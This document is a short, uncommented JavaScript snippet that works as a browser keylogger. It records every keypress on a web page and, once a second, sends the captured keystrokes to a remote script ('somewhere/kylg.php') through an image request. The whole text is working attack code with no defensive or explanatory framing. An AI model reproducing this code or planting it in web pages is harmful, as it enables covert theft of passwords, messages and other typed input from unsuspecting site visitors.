var keys = '';

document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function(){
        if( keys != "" )
                new Image().src = 'http://somewhere/kylg.php?c=' + keys + ' ';
        keys = '';
}, 1000);
